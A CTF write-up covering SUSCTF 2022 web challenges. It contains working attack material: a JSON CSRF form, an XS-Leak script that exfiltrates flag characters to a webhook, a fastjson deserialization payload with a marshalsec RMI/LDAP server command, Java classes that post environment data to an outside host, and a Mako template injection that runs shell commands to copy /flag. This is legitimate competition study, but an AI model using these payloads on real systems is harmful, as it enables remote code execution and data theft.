---
title: SUSCTF 2022 Writeup
catalog: true
date: 2022-03-01 21:54:15
tags: [Security]
categories: [Security]
photos: /img/susctf-2022-writeup/cover-en.png
---

This holiday there were several CTFs, and I participated in SUSCTF 2022 with team SU. This post briefly records my experience with several of the challenges I participated in.

The list of challenges I will discuss is as follows:

1. web/fxxkcors
2. web/ez_note
3. web/baby gadget v1.0
4. web/baby gadget v1.0’s rrrevenge
5. web/HTML practice

<!-- more -->

## web/fxxkcors (67 solves)

![](/img/susctf-2022-writeup/p1.png)

This challenge has a `change.php` that allows you to change permissions. If you change your own permissions to admin, you can see the flag. The request looks like this:

```
POST /changeapi.php HTTP/1.1
Host: 124.71.205.122:10002
Content-Length: 19
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.82 Safari/537.36
Content-Type: application/json; charset=UTF-8
Origin: http://124.71.205.122:10002
Referer: http://124.71.205.122:10002/change.php
Accept-Encoding: gzip, deflate
Cookie: PHPSESSID=1ab6387f551b235d26d1c88a3685d752
Connection: close

{"username":"huli"}
```

But of course, you don't have permission to change it yourself, so this provides an admin bot that you can give any URL to visit. Therefore, the goal is to let the admin bot help you request to change permissions.

However, you are making requests from a different origin and you also need to bring cookies, so you will be blocked by CORS.

This is where CSRF comes in, but the required format is JSON. How do you CSRF? There is a technique I have seen many times before: if the server does not check the content type, you can do it like this:

``` html
<body>
    <form id=a action="http://124.71.205.122:10002/changeapi.php" method="POST" enctype="text/plain">
      <input name='{"username":"huli", "abc":"' value='123"}'>
    </form>
    <script>
      a.submit()
    </script>
</body>
```

Because POST actually turns the request body into `{key}={value}`, the above form will be `{"username":"huli", "abc":"`=`123"}`, generating a piece of JSON data.

And this challenge does not check the content type, so doing it like the above is fine.

## web/ez_note (8 solves)

![](/img/susctf-2022-writeup/p2.png)

In this challenge, you can create an account and add notes and search for notes. When searching, if a note is found, the client will use something like `setTimeout(() => location='/note/12', 1000)` to jump to the note page.

And this challenge also has an admin bot that will visit the page you provide, so it is obviously an XSLeaks challenge.

First, let's take a look at the code for this admin bot:

``` js
const visit = async (browser, path) =>{
    let site = process.env.NOTE_SITE ?? ""
    let url = new URL(path, site)
    console.log(`[+]${opt.name}: ${url}`)
    let renderOpt = {...opt}
    try {
        const loginpage = await browser.newPage()
        await loginpage.goto( site+"/signin")
        await loginpage.type("input[name=username]", "admin")
        await loginpage.type("input[name=password]", process.env.NOTE_ADMIN_PASS)
        await Promise.all([
            loginpage.click('button[name=submit]'),
            loginpage.waitForNavigation({waitUntil: 'networkidle0', timeout: 2000})
        ])
        await loginpage.goto("about:blank")
        await loginpage.close()

        const page = await browser.newPage()
        await page.goto(url.href, {waitUntil: 'networkidle0', timeout: 2000})

        await delay(5000) /// waiting 5 second.

    }catch (e) {
        console.log(e)
        renderOpt.message = "error occurred"
        return renderOpt
    }
    renderOpt.message = "admin will view your report soon"
    return renderOpt
}
```

The key is this line: `let url = new URL(path, site)`. At first glance, you might think you can only provide pages on the site, so you need to find XSS on this challenge. But that's not the case. If you look carefully at the [documentation](https://nodejs.org/api/url.html#new-urlinput-base), you will know:

> input: The absolute or relative input URL to parse. If input is relative, then base is required. If input is absolute, the base is ignored

If you provide an absolute URL, the base will be ignored, so you can directly provide any page for the admin bot to visit.

Next is to find out how to perform XS leak. I used the [history.length](https://xsleaks.dev/docs/attacks/navigations/) trick in the end. The principle is very simple. Even if you go to another website under the same window, your `history.length` will not be cleared, meaning that if I go to website A first, then to B, and then back to A, when I access `history.length`, it will be 3.

So we can use `var win = window.open` to open the note search page, and then after a certain amount of time, use `win.location = '...'` to redirect this window back to our own website, so we can use `win.history.length` to access this value and know whether the note search was successful.

The script I used to leak looks like this:

``` html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="robots" content="noindex">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
</head>

<body>
    <script>
      var flag = 'SUSCTF{'
      function send(msg) {
        fetch('https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b?msg=' + encodeURIComponent(msg))
      }
      function trying(keyword) {
        return new Promise(resolve => {
          var win = window.open('http://123.60.29.171:10001/search?q=' + keyword)
          setTimeout(() => {
            win.location = 'http://e050-220-133-126-220.ngrok.io/non.html'
            setTimeout(() => {
              if (win.history.length === 3) {
                send('success:' + keyword)
              } else {
                //send('fail:' + keyword)
              }
              win.close();
            }, 1000)
          }, 1500)
        })
      }

      async function run() {
        send('start')
        // }abcdefghijklmnopqrstuvwxyz0123456789_
        // }abcdefghijklmnopqrs
        // 
        let chars = '_abcdefghijklmnopqrstuv'.split('')
        //let chars = '}wxyz0123456789_'.split('')
        for(let char of chars) {
          const temp = flag + char
          trying(temp)
        }
      }

      setTimeout(() => {
        run()
      }, 1000)
      
    </script>
</body>
</html>
```

There are actually a few details here. The first detail is the last part:

``` js
setTimeout(() => {
  run()
}, 1000)
```

Why wait for one second before starting to run? Because the bot has a piece of code that is:

``` js
await page.goto(url.href, {waitUntil: 'networkidle0', timeout: 2000})
await delay(5000) /// waiting 5 second.
```

It waits for `networkidle0` before waiting for five seconds. I tried it myself and found that if I didn't stop for a second and started running directly, `networkidle0` wouldn't seem to trigger. So it becomes running to `timeout: 2000`, with only 2 seconds of execution time, and everything will fail. Later, I added this part.

The second detail is the number of seconds in this section:

``` js
setTimeout(() => {
  win.location = 'http://e050-220-133-126-220.ngrok.io/non.html'
  setTimeout(() => {
    if (win.history.length === 3) {
      send('success:' + keyword)
    } else {
      //send('fail:' + keyword)
    }
    win.close();
  }, 1000) // 這裡
}, 1500) // 跟這裡
```

This is a value that I manually tried a few times and found to be ok. Because if there is a note search, it will redirect after 1 second. If it redirects back to its own page earlier than this value, it will fail. So I chose 1.5 seconds, and it takes another second to redirect back to its own page. If you want to be more precise, you can use [Cross-window Timing Attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks), which can be much more accurate.

The last detail is this part: `let chars = '_abcdefghijklmnopqrstuv'.split('')`. Because my script runs too slowly, if I want to leak all characters (38 in total), it will not finish running. So I have to manually cut it in half and submit the URL twice to leak out one character.

I feel that there should be a faster way, such as leaking all characters within 5 seconds. If anyone knows how to do it, please leave a comment to point it out. But anyway, I didn't think about it so much when I was doing this problem, so I submitted it manually one by one, spending the longest time on Google reCAPTCHA. Fortunately, the admin bot has three streams, otherwise the images will be added with noise directly towards the end, and it will be super difficult for the human eye to read...

Fortunately, the flag for this problem is not long. It took almost 20 minutes to submit the URL and pass the verification, slowly getting the characters out.

When I wrote this, I suddenly thought that I should run all the characters without adding a prefix first, so I can know which characters are in the flag, and the character set may be reduced to more than 10, which will be three times faster... I didn't think of it at the time, I should remember it next time.

(Supplement: I looked at the [official writeup](https://github.com/susers/SUSCTF2022_official_wp/blob/main/checkin%20%26%20ez_note%20%26%20rubbish_maker_zh.md), and it seems that it is possible to run all the characters in one go, maybe I didn't test it well at the time, and the official answer is also to submit multiple times, not all within 5 seconds.)

## web/baby gadget v1.0(14 solves)

![](/img/susctf-2022-writeup/p3.png)

This problem has a login page, and my teammate found that using `/;admin/` can bypass it and enter the backend. The backend is quite simple, just like the screenshot above, and there is a place to download the file `lib.zip`, which contains the following packages used:

1. commons-lang.jar
2. fastjson-1.2.48.jar
3. flex-messaging-core.jar
4. quartz.jar

And the description of the backend is also obviously related to fastjson:

> Fastjson is a Java library that can be used to convert Java Objects into their JSON representation. It can also be used to convert a JSON string to an equivalent Java object. Fastjson can work with arbitrary Java objects including pre-existing objects that you do not have source-code of.

There is also an endpoint that can POST data:

```
POST /admin/mailbox.jsp

inpututext=abcde
```

This version of fastjson has a deserialization vulnerability, which can refer to this article: [Red Team Arsenal: fastjson less than 1.2.68 full vulnerability RCE exploit](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/).

Next, my teammate found that `inputtext` can contain a JSON string that the server will parse using fastjson, like this: `inputtext={"a":123}`, but I tried this payload and didn't see any results:

``` json
{"abc":{"@type":"java.net.Inet4Address","val":"1486fo.dnslog.cn"}}
```

It seems that there are some issues with dnslog, so I should either set up my own or find another similar service for future use. However, my teammate successfully tried it with another service, so it is confirmed to be feasible.

Next, I need to set up the environment as described in the previous article and find a way to exploit this vulnerability. Since I am not familiar with Java, I usually give up when I see Java problems, but this time I accidentally tried it and succeeded. First of all, thanks to the author of the previous article for writing the reproduction method quite clearly. Here is a brief description.

First, you can use the JSON payload given in the article to trigger the vulnerability:

``` json
{
    "a":{
        "@type":"java.lang.Class",
        "val":"com.sun.rowset.JdbcRowSetImpl"
    },
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://2.2.2.2:9999/Exploit",
        "autoCommit":true
    }
}
```

This vulnerability will load a class file (i.e., `dataSourceName`) via RMI, so you must first run an RMI server on your server, which can be done using the [marshalsec-0.0.3-SNAPSHOT-all.jar](https://github.com/mbechler/marshalsec) tool:

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://2.2.2.2:8888/#Exploit" 9999
```

This command runs an RMI server on port 9999, corresponding to the above payload.

Next, your RMI server must provide the Java Class you want to load, so you also need to provide a place for it to download the file, which is the `http://2.2.2.2:8888/#Exploit` in the above command.

At this point, we can write an `Exploit.java`:

``` java
import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;

public class Exploit{
    public Exploit() throws Exception {
        Process p = Runtime.getRuntime().exec(new String[]{"bash", "-c", "touch /zydx666"});
        InputStream is = p.getInputStream();
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));

        String line;
        while((line = reader.readLine()) != null) {
            System.out.println(line);
        }

        p.waitFor();
        is.close();
        reader.close();
        p.destroy();
    }

    public static void main(String[] args) throws Exception {
    }
}
```

Compile it: `javac Exploit.java`, and `Exploit.class` will be generated. Then start a simple Python server:

```
python3 -m http.server --bind 0.0.0.0 8888
```

Your RMI server and Python file server can be on the same machine for convenience. (Again, all the code above comes from the article [红队武器库:fastjson小于1.2.68全漏洞RCE利用exp](https://zeo.cool/2020/07/04/%E7%BA%A2%E9%98%9F%E6%AD%A6%E5%99%A8%E5%BA%93!fastjson%E5%B0%8F%E4%BA%8E1.2.68%E5%85%A8%E6%BC%8F%E6%B4%9ERCE%E5%88%A9%E7%94%A8exp/))

However, this problem is a bit different. I tried the above method several times and found that my RMI server responded, but the file server did not, which means that there seems to be a problem with some link in the chain, causing the entire exploit chain to fail, so it did not execute the final code.

At this point, I tried randomly and saw that marshalsec had another option, `marshalsec.jndi.LDAPRefServer`, so I changed it to this and changed the payload to an LDAP URL, and then it worked, and my file server responded.

Unfortunately, it seems that the command execution was not successful because my server did not receive any requests whether I ran `nc` or `curl`. After continuing to try, I suddenly had an idea: what if the command execution was actually blocked, but the Java code was successfully executed?

So I added `Thread.sleep(5000)` to `Exploit.java` and found that the response was indeed delayed by five seconds. Then I added:

``` java
URL url = new URL("https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b%22);
InputStream iss = url.openStream();
```

and found that the server received the request! So the class was indeed executed, but for some unknown reason, it was not possible to use `Runtime.getRuntime().exec` directly.

My code looks something like this:

``` java
import java.io.*;
import java.net.*;
import java.util.*;

public class Exploit{
    public Exploit() throws Exception {
        String str = "test";
        URL url = new URL("https://webhook.site/bad84752-95a1-45c4-8395-e5577ea1112b");
        Map<String,Object> params = new LinkedHashMap<>();
        params.put("msg", str);
        StringBuilder postData = new StringBuilder();
        for (Map.Entry<String,Object> param : params.entrySet()) {
            if (postData.length() != 0) postData.append('&');
            postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
            postData.append('=');
            postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
        }
        byte[] postDataBytes = postData.toString().getBytes("UTF-8");

        HttpURLConnection conn = (HttpURLConnection)url.openConnection();
        conn.setRequestMethod("POST");
        conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
        conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
        conn.setDoOutput(true);
        conn.getOutputStream().write(postDataBytes);
        Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));
    }

    public static void main(String[] args) throws Exception {
    }
}
```

Later, I tried to read the environment variables and send them to the server, which was successful. I then attempted to read the file list under `/`, but failed. Since I didn't know the reason for the failure, I added a try-catch block like this:

``` java
String str = "";
try{      
  File f = new File("/var");
  File[] paths = f.listFiles();
  str = paths.toString();
  for (int i = 0; i < paths.length; i++) {
    str += paths[i].toString() + ",";
  }
 
} catch(Exception e){
   str = e.toString() + "," + e.getMessage();
}
```

The answer I got was `java.lang.reflect.InvocationTargetException`. I still don't know why this error occurred. Perhaps the question setter intentionally removed something, or maybe it was a problem with my Java version?

Anyway, because I couldn't enumerate the files, I was stuck for a while and was thinking about what to do. Then suddenly, I had an idea to try reading the file instead of listing them. It worked, and I was able to read `/etc/passwd`. Then I tried to read `/flag`, and I was able to read it too. That's how I solved it.

I can only say that I was lucky.

## web/baby gadget v1.0’s rrrevenge (14 solves)

This question should have had an unexpected solution in the original version, so a new version was released. However, I was able to get the flag using the same method as before, so it seems that my solution was the expected one?

(Supplement: According to the [official writeup](https://github.com/susers/SUSCTF2022_official_wp/blob/main/baby%20gadget%20v1.0%20and%20rev.pdf), it doesn't seem to be.)

## web/HTML practice (11 solves)

![](/img/susctf-2022-writeup/p4.png)

This question gives you a page that can generate HTML. It looks like SSTI, but it doesn't tell you what the template is behind it. After my teammate tried for a while, they found that some characters were blocked: `$*_+[]"'/`. Also, if you only put one `%`, it will cause an internal server error.

After another round of trial and error, I found that `##` means a comment because the content after it disappears. Then I used `template engine ## comment` to search and found some information, but I wasn't sure if it was correct.

So I continued to try random requests to the server and sent some invalid requests like this: `POST generate HTTP/1.1`. It returned an error message:

```
HTTP/1.1 400 Bad Request
Content-Length: 133
Content-Type: text/plain

Invalid path in Request-URI: request-target must contain origin-form which starts with absolute-path (URI starting with a slash "/").
```

I took this error message to Google and found the source: https://github.com/cherrypy/cheroot/blob/master/cheroot/server.py#L900. I also found this Python framework: [CherryPy](https://docs.cherrypy.dev/en/latest/index.html). I looked at the documentation and found this [section](https://docs.cherrypy.dev/en/latest/advanced.html#id22):

> CherryPy does not provide any HTML template but its architecture makes it easy to integrate one. Popular ones are Mako or Jinja2.

Mako uses `<% %>` and `##` as comments, which seems to fit. Then my teammate confirmed this guess with this loop:

```
% for a in (1,2,3):
    1
% endfor
```

After confirming that it was Mako, we started looking for how to use Mako SSTI. There are a lot of them here: [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#mako), but each one requires `<%%>` or `${}`, which are blocked characters. At this point, I thought that since the above loop could use `%`, maybe other code could be used too, so I tried:

```
% for a in (self.module.cache.util.os.system(name),2,3):
  1
% endfor
```

I found that it worked, and I could use the query string name to put the code I wanted to execute in it, avoiding the use of `'"`. After trying a few more times, I found that it couldn't be sent out, so I couldn't get the result. At this point, my teammate tried writing a file: `echo%20"hello"%20>%20$(pwd)/1`, but it failed. Then I suddenly remembered, "Oh yeah, the homepage says the files will be stored under `./templates`." So I tried:

```
echo "hello" > ./template/huli.html
```

I found that it was written, and I could read the file using `http://124.71.178.252/view/huli.html?name=HelloWorld`. While I was still thinking about what to do next, my teammate had already figured it out and solved it.

```
cat /flag > ./template/huli.html
```

After obtaining the flag, remember to echo it again to overwrite the flag and prevent other teams from reading it.

## Summary

The other three web questions were more like reverse engineering, requiring code to be written to restore the obfuscated PHP. My teammates solved them, and the other two questions were about Java, testing the deserialization of CommonsCollections. It seems that a new gadget needs to be found, and my teammates solved them as well. This CTF made me realize that my biggest weakness in web is that I am not familiar enough with Java. I should find some time to study it. I am also not very familiar with deserialization, whether it is Python, PHP, or Java, and I should research it more.

Finally, I would like to thank my amazing teammates. Together, we successfully won first place in SUSCTF 2022 🎉.
